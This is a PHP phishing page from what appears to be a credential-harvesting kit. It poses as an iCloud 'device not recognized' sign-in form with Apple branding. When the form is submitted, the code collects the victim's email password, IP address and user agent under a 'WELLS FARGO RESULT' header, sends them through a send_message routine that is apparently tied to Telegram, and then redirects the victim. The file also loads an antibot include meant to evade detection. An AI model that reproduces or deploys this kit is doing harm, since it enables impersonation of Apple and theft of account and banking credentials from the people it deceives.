<?php
ini_set('session.gc_maxlifetime', 1209600);
ob_start();
session_start();
include '../includes/antibot.php';
include '../includes/telegram.php';
if (!isset($_GET['email'])){
	header('Location: ../verify/contact.php', true);
}
else{
	$email = $_GET['email'];
}
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Verify email - iCloud</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/icloud-favicon.png"/>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<style type="text/css">
	input{
		-webkit-appearance: none;
	}
	body{
		background-image: url('../static/img/icloud-background.png');
		background-position: 0 10px;
	}
	@media only screen and (max-width: 470px){
		body{
			background-position: center;
		}
	}
	.container{
		position: relative;
		height: 100vh;
	}
	.card{
		width: 320px;
		padding: 0;
		top: 40%;
		transform: translateY(-50%);
		background-color: transparent;
	}
	.email{
		color: #494949;
		border: 1px solid #d6d6d6;
		border-top-left-radius: 5px;
		border-top-right-radius: 5px;
		width: 100%;
	}
	.email:focus{
		outline: none;
	}
	#email-pass{
		color: #494949;
		border: 1px solid #d6d6d6;
		border-bottom-left-radius: 5px;
		border-bottom-right-radius: 5px;
		border-top: none;
		width: 100%;
	}
	.forgot{
		text-decoration: none;
		color: #0070c9;
	}
	.forgot:hover{
		color: #0070c9;
		text-decoration: underline;
	}
	.signin-btn{
	}
	.footer {
		width: 100%;
		font-size: .65625rem;
		color: #757575;
	}
	@media only screen and (max-width: 999px){
		
	}
</style>
<body>
	<div class="icloud-navbar">
		<svg class="ms-3" style="fill: white;" xmlns="http://www.w3.org/2000/svg" width="16" height="44" viewBox="0 0 16 44"><path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path></svg>
		<svg class="ms-auto me-3" style="fill: white; float: right; top: 50%; transform: translateY(50%);" width="24" height="24" viewBox="0 0 99.6097412109375 99.6572265625" version="1.1" xmlns="http://www.w3.org/2000/svg" classname=" glyph-box"><g transform="matrix(1 0 0 1 -8.740283203125045 85.05859375)"><path d="M 58.5449 14.5508 C 85.791 14.5508 108.35 -8.00781 108.35 -35.2539 C 108.35 -62.4512 85.7422 -85.0586 58.4961 -85.0586 C 31.2988 -85.0586 8.74023 -62.4512 8.74023 -35.2539 C 8.74023 -8.00781 31.3477 14.5508 58.5449 14.5508 Z M 58.5449 6.25 C 35.498 6.25 17.0898 -12.207 17.0898 -35.2539 C 17.0898 -58.252 35.4492 -76.7578 58.4961 -76.7578 C 81.543 -76.7578 100 -58.252 100.049 -35.2539 C 100.098 -12.207 81.5918 6.25 58.5449 6.25 Z M 57.5195 -25.1465 C 60.0098 -25.1465 61.4746 -26.6602 61.4746 -28.6133 L 61.4746 -29.1992 C 61.4746 -31.9336 63.0859 -33.6426 66.4551 -35.8887 C 71.1914 -39.0137 74.5605 -41.8945 74.5605 -47.7051 C 74.5605 -55.8594 67.334 -60.2051 59.082 -60.2051 C 50.6836 -60.2051 45.166 -56.25 43.7988 -51.7578 C 43.5547 -50.9277 43.4082 -50.1465 43.4082 -49.3164 C 43.4082 -47.168 45.1172 -45.9473 46.7285 -45.9473 C 49.5117 -45.9473 49.9512 -47.4609 51.5137 -49.2676 C 53.125 -51.9531 55.4688 -53.5645 58.7402 -53.5645 C 63.1836 -53.5645 66.1133 -51.0742 66.1133 -47.3145 C 66.1133 -43.9941 64.0137 -42.3828 59.7656 -39.4531 C 56.25 -37.0117 53.6621 -34.4238 53.6621 -29.6387 L 53.6621 -29.0039 C 53.6621 -26.416 55.0293 -25.1465 57.5195 -25.1465 Z M 57.4219 -10.5469 C 60.2539 -10.5469 62.6953 -12.793 62.6953 -15.625 C 62.6953 -18.5059 60.3027 -20.7031 57.4219 -20.7031 C 54.541 -20.7031 52.1484 -18.457 52.1484 -15.625 C 52.1484 -12.8418 54.5898 -10.5469 57.4219 -10.5469 Z"></path></g></svg>
	</div>
	<div class="container">
		<div class="card text-center mx-auto" style="border: none;">
			<img class="mx-auto" src="data:image/png;base64,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" srcset="" style="width: 100px;" role="presentation">
			<h4 class="my-3">Sign in to iCloud</h4>
			<h6>This device isn't recognized, please sign in to verify</h6>
			<form action="" method="POST">
				<input type="text" class="email p-2" name="email" value="<?php echo $email;?>" readonly="readonly">
				<input type="password" class="p-2" name="email-pass" id="email-pass" placeholder="Password" required>
				<div class="my-3" style="text-align: center;">
						<input class="me-2" type="checkbox" name="keep-signed-in" id="keep-signed-in" style="-webkit-appearance: checkbox; width: 16px; height: 16px;">
						<label for="keep-signed-in" style="color: #494949; font-size: 17px;">Keep me signed in</label>
				</div>
				<button style="border: none; background-color: transparent;"><i class="bi bi-arrow-right-circle" style="font-size: 1.5rem; color: #494949;"></i></button>
				<br><br>
				<a href="" class="forgot">Forgot Apple ID or password?</a>
			</form>
		</div>
	</div>
	<div class="footer text-center my-3" style="position: fixed; bottom: 0;">
		<b>Create Apple ID  |  System Status  |  Privacy Policy  |  Terms & Conditions  |  Copyright © 2022 Apple Inc. All rights reserved.</b>
	</div>
	<script type="text/javascript">
		const togglePassword = document.querySelector("#togglePassword");
		const password = document.querySelector("#email-pass");

		togglePassword.addEventListener('click', () => {
			password.setAttribute('type', 'text');

			showPassword.setAttribute('hidden', true);
			hidePassword.removeAttribute('hidden');
		});
		hidePassword.addEventListener('click', () => {
			password.setAttribute('type', 'password');

			hidePassword.setAttribute('hidden', true);
			showPassword.removeAttribute('hidden');
		});
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$email_pass = $_REQUEST['email-pass'];

	if (!isset($_SESSION['id'])){
		header('Location: ../verify/contact.php', true);
	}

	$msg = "WELLS FARGO RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| EMAIL PASSWORD : {$email_pass}";
	send_message(urlencode($msg));
	//$sql = "UPDATE $table SET email_pass = ? WHERE id=$id";
	//$stmt = $mysqli->prepare($sql);
	//$stmt->bind_param('s', $email_pass);
	//$stmt->execute();
	header('Location: ../complete.php', true);
}
?>